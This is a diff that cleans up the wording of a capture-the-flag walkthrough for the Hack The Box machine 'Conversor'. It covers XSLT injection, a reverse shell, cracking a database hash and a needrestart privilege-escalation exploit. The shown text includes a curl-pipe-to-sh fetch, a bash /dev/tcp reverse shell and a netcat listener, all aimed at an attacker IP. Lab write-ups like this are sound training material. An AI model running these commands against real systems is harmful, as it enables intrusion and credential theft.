@@ -1,41 +1,41 @@
 ---
 
-# COnversor (Easy): 10.10.11.92
+# Conversor (Easy): 10.10.11.92
 
 ![Icon](Images/coversoricon.png)
 
 ---
 
-## Quick Overview
+## Quick overview
 
-a new linux machine, with easy difficulty, that put in front of us :
+A new Linux machine (easy) that presented the following path:
 
-1. **XSLT Exploitation** → Database Access → **USER.TXT**
-2. **Needrestart 3.7 Privilege Escalation** → [CVE-2024-48990 Auto Exploit](https://github.com/Serner77/CVE-2024-48990-Automatic-Exploit) → *Thanks to @Serner77* → **ROOT.TXT**
+1. **XSLT exploitation** → Database access → **USER.TXT**
+2. **Needrestart 3.7 privilege escalation** → [CVE-2024-48990 automatic exploit](https://github.com/Serner77/CVE-2024-48990-Automatic-Exploit) → *Thanks to @Serner77* → **ROOT.TXT**
 
 ---
 
 ## USER.TXT
 
-### NMAP Enumeration
+### Nmap enumeration
 
-as with every machine we start with the nmap scan, that show as a classic 22/80 ports.
+As usual, we start with an `nmap` scan, which shows the classic ports 22 and 80.
 
 ![Icon](Images/nmapscan.png)
 
-we go to conversor web page, as first sight we see XML converation via XSLT, with a small round with the discover the source code in the About page.
+We opened the Conversor web page and quickly noticed XML conversion via XSLT. The **About** page hinted that the source is discoverable.
 
-in the Source code we got some valuabla informations, the most imprtants are :
+From the source code we found several useful details:
 
-1. XSLT is exploitable
-2. you can run python scripts in the scripts directory, you can find this info in install.md
-3. the users database is in instance directory
+1. The XSLT is exploitable.
+2. Python scripts can be executed from the **scripts** directory (this is mentioned in `install.md`).
+3. The users database is stored in the **instance** directory.
 
-### First Step
+### First step
 
-so first of all we will start with a reverse shell, by writing a python script with the help of xslt file, that will use curl to connect to our machine, that have aleardy a python http server prepared, to copy a reverse shell script, and lunche it to get our initial login.
+We started by obtaining a reverse shell. Using the XSLT file we uploaded, we instructed the server to write a Python script to `/var/www/conversor.htb/scripts/shell.py`, which then uses `curl` to fetch a reverse-shell script from our machine.
 
-so upload this XSLT File:
+Upload the following XSLT file:
 
 ```XSLT
 <?xml version="1.0" encoding="UTF-8"?>
@@ -53,32 +53,32 @@ os.system("curl 10.10.14.203:8000/shell.sh|sh")
 </xsl:stylesheet>
 ```
 
-and we prepare a python http server by using the command `python3 -m http.server`, where the reverse shell script exist:
+On our machine we started a simple HTTP server with `python3 -m http.server` to host the reverse-shell script:
 
 ```sh
 #!/bin/bash
 bash -c 'bash -i >& /dev/tcp/10.10.14.203/9999 0>&1'
 ```
 
-and last thing, nc listener `nc -nlvp 9999`.
+Then we ran a netcat listener: `nc -nlvp 9999`.
 
-and by that we get our initial access, as you can see:
+This gave us initial access, as shown below:
 
 ![Icon](Images/xsltrevshell.png)
 
-### DB Exploit
+### Database download
 
-For the next step, we will copie the DB to our local machine so we can exploit it peacefully, so i launched a python http server in the victim machine to copy the DB:
+Next, we copied the SQLite database from the target to our machine so we could analyze it safely. We launched a Python HTTP server on the victim to serve the DB and downloaded it locally:
 
 ![Icon](Images/dbdownload.png)
 
-i open the DB with sqlite browser, and found the user fismathack with it hashed password
+I opened the DB with `sqlitebrowser` and found the user **fismathack** with a hashed password:
 
 ![Icon](Images/sqlitebrowser.png)
 
-### Final Touch
+### Final step 
 
-By cracking the hash via [CrackStation](https://crackstation.net), we can login with fismathack and via SSH and capture the USER.TXT flag.
+After cracking the hash with [CrackStation](https://crackstation.net) we could log in as **fismathack** over SSH and capture the `USER.TXT` flag.
 
 ![Icon](Images/usertxt.png)
 
@@ -86,23 +86,23 @@ By cracking the hash via [CrackStation](https://crackstation.net), we can login 
 
 ## ROOT.TXT
 
-### Discover
+### Discovery
 
-In this part we will start with `sudo -l`, and discover that we have sudo right to needrestart 3.7.
+We ran `sudo -l` and discovered we could run `needrestart 3.7` with sudo privileges.
 
 ![Icon](Images/sudol.png)
 
 ### Exploit
 
-With a small research we found that we can privilege escal with needrestart 3.7, than correspendant to CVE-2024-48990.
+A quick research showed that `needrestart 3.7` is vulnerable (CVE-2024-48990). I used the following PoC: [CVE-2024-48990-Automatic-Exploit](https://github.com/Serner77/CVE-2024-48990-Automatic-Exploit).
 
-And i have used the following Poc [CVE-2024-48990-Automatic-Exploit](https://github.com/Serner77/CVE-2024-48990-Automatic-Exploit)
+> Note: If the exploit doesn't work, reset the machine on HTB and try again.
 
-PS: if it doesn't work, reset the machine from HTB.
+The exploit grants a root shell, allowing us to read `ROOT.TXT`:
 
 ![Icon](Images/privescal.png)
 
-an as you can see it connect you with root privilege, and we can capture the ROOT.TXT flag.
+As you can see, the exploit provided a root shell and we captured the `ROOT.TXT` flag.
 
 ![Icon](Images/roottxt.png)
 
